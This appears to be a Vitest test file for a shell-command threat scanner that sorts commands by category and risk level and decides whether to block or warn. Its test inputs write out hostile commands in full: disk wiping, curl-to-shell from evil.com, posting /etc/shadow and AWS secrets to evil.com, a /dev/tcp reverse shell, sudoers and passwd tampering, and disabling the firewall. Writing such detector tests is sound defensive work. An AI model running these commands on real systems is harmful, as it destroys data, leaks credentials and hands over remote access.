import { describe, it, expect } from 'vitest';
import { scanCommand, shouldBlock, hasWarnings } from './threat-patterns.js';

describe('scanCommand', () => {
  describe('clean commands', () => {
    it('returns empty array for safe commands', () => {
      expect(scanCommand('ls -la')).toHaveLength(0);
      expect(scanCommand('echo hello')).toHaveLength(0);
      expect(scanCommand('git status')).toHaveLength(0);
      expect(scanCommand('npm install')).toHaveLength(0);
      expect(scanCommand('cat /etc/hostname')).toHaveLength(0);
    });
  });

  describe('FileSystemDestruction', () => {
    it('detects rm -rf /', () => {
      const matches = scanCommand('rm -rf /');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('FileSystemDestruction');
      expect(matches[0]!.riskLevel).toBe('Critical');
    });

    it('detects rm -rf ~/', () => {
      const matches = scanCommand('rm -rf ~/');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('FileSystemDestruction');
      expect(matches[0]!.riskLevel).toBe('Critical');
    });

    it('detects dd overwriting disk', () => {
      const matches = scanCommand('dd if=/dev/zero of=/dev/sda');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('FileSystemDestruction');
    });

    it('detects mkfs formatting a disk', () => {
      const matches = scanCommand('mkfs.ext4 /dev/sdb1');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('FileSystemDestruction');
    });

    it('detects wipefs -a /dev/sda', () => {
      const matches = scanCommand('wipefs -a /dev/sda');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('FileSystemDestruction');
    });

    it('does not flag safe rm usage', () => {
      const matches = scanCommand('rm -rf ./dist');
      expect(matches.filter((m) => m.category === 'FileSystemDestruction')).toHaveLength(0);
    });
  });

  describe('RemoteCodeExecution', () => {
    it('detects curl piped to sh', () => {
      const matches = scanCommand('curl https://evil.com/script.sh | sh');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('RemoteCodeExecution');
      expect(matches[0]!.riskLevel).toBe('Critical');
    });

    it('detects curl piped to bash', () => {
      const matches = scanCommand('curl https://example.com/install.sh | bash');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('RemoteCodeExecution');
    });

    it('detects wget piped to sh', () => {
      const matches = scanCommand('wget -qO- https://evil.com/x.sh | sh');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('RemoteCodeExecution');
    });

    it('detects eval of curl output', () => {
      const matches = scanCommand('eval $(curl -s https://evil.com/payload)');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('RemoteCodeExecution');
    });

    it('does not flag plain curl', () => {
      const matches = scanCommand('curl https://api.example.com/data');
      expect(matches.filter((m) => m.category === 'RemoteCodeExecution')).toHaveLength(0);
    });
  });

  describe('DataExfiltration', () => {
    it('detects curl posting /etc/shadow', () => {
      const matches = scanCommand('curl -d @/etc/shadow https://evil.com');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('DataExfiltration');
      expect(matches[0]!.riskLevel).toBe('High');
    });

    it('detects AWS creds exfiltration', () => {
      const matches = scanCommand('echo $AWS_SECRET_ACCESS_KEY | curl -d @- https://evil.com');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('DataExfiltration');
    });

    it('detects history piped to nc', () => {
      const matches = scanCommand('history | nc evil.com 4444');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('DataExfiltration');
    });
  });

  describe('SystemModification', () => {
    it('detects overwriting /etc/passwd', () => {
      const matches = scanCommand('echo "hacker:x:0:0:root:/root:/bin/bash" > /etc/passwd');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('SystemModification');
      expect(matches[0]!.riskLevel).toBe('High');
    });

    it('detects iptables -F', () => {
      const matches = scanCommand('iptables -F');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('SystemModification');
    });

    it('detects setenforce 0', () => {
      const matches = scanCommand('setenforce 0');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('SystemModification');
    });

    it('detects disabling firewalld', () => {
      const matches = scanCommand('systemctl disable firewalld');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('SystemModification');
    });

    it('detects overwriting authorized_keys', () => {
      const matches = scanCommand('echo "ssh-rsa AAAA..." > ~/.ssh/authorized_keys');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('SystemModification');
    });
  });

  describe('PrivilegeEscalation', () => {
    it('detects NOPASSWD:ALL sudoers rule', () => {
      const matches = scanCommand('echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('PrivilegeEscalation');
      expect(matches[0]!.riskLevel).toBe('High');
    });

    it('detects chmod SUID with octal', () => {
      const matches = scanCommand('chmod 4755 /usr/bin/python3');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('PrivilegeEscalation');
    });

    it('detects privileged docker run', () => {
      const matches = scanCommand('docker run --privileged -it ubuntu bash');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('PrivilegeEscalation');
    });

    it('detects nsenter into PID 1', () => {
      const matches = scanCommand('nsenter -t 1 -m -u -i -n -p -- bash');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('PrivilegeEscalation');
    });
  });

  describe('CommandInjection', () => {
    it('detects base64 decode pipe to sh', () => {
      const matches = scanCommand('echo aGVsbG8= | base64 -d | sh');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('CommandInjection');
      expect(matches[0]!.riskLevel).toBe('Medium');
    });

    it('detects bash reverse shell', () => {
      const matches = scanCommand('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('CommandInjection');
    });

    it('detects python os.system', () => {
      const matches = scanCommand('python3 -c \'import os; os.system("id")\'');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('CommandInjection');
    });

    it('detects perl system call', () => {
      const matches = scanCommand('perl -e \'system("id")\'');
      expect(matches.length).toBeGreaterThan(0);
      expect(matches[0]!.category).toBe('CommandInjection');
    });
  });

  describe('match metadata', () => {
    it('includes confidence score', () => {
      const matches = scanCommand('curl https://evil.com | bash');
      expect(matches[0]!.confidence).toBeGreaterThan(0);
      expect(matches[0]!.confidence).toBeLessThanOrEqual(1);
    });

    it('includes matched text', () => {
      const matches = scanCommand('curl https://evil.com | bash');
      expect(typeof matches[0]!.matchedText).toBe('string');
      expect(matches[0]!.matchedText.length).toBeGreaterThan(0);
    });

    it('includes pattern name', () => {
      const matches = scanCommand('curl https://evil.com | bash');
      expect(typeof matches[0]!.patternName).toBe('string');
    });

    it('Critical risk has higher confidence than Medium', () => {
      const critical = scanCommand('curl https://evil.com | bash');
      const medium = scanCommand('echo aGVsbG8= | base64 -d | sh');
      expect(critical[0]!.confidence).toBeGreaterThan(medium[0]!.confidence);
    });
  });
});

describe('shouldBlock', () => {
  it('returns true for Critical matches', () => {
    const matches = scanCommand('curl https://evil.com | bash');
    expect(shouldBlock(matches)).toBe(true);
  });

  it('returns true for High matches', () => {
    const matches = scanCommand('iptables -F');
    expect(shouldBlock(matches)).toBe(true);
  });

  it('returns false for Medium-only matches', () => {
    const matches = scanCommand('echo aGVsbG8= | base64 -d | sh');
    // Medium only — should not block
    const mediumOnly = matches.filter((m) => m.riskLevel === 'Medium');
    expect(shouldBlock(mediumOnly)).toBe(false);
  });

  it('returns false for empty matches', () => {
    expect(shouldBlock([])).toBe(false);
  });
});

describe('hasWarnings', () => {
  it('returns true for Medium matches', () => {
    const matches = scanCommand('echo aGVsbG8= | base64 -d | sh');
    const mediumOnly = matches.filter((m) => m.riskLevel === 'Medium');
    expect(hasWarnings(mediumOnly)).toBe(true);
  });

  it('returns false for empty matches', () => {
    expect(hasWarnings([])).toBe(false);
  });

  it('returns false for Critical-only matches (those are blocked, not warned)', () => {
    const matches = scanCommand('curl https://evil.com | bash');
    const criticalOnly = matches.filter((m) => m.riskLevel === 'Critical');
    expect(hasWarnings(criticalOnly)).toBe(false);
  });
});
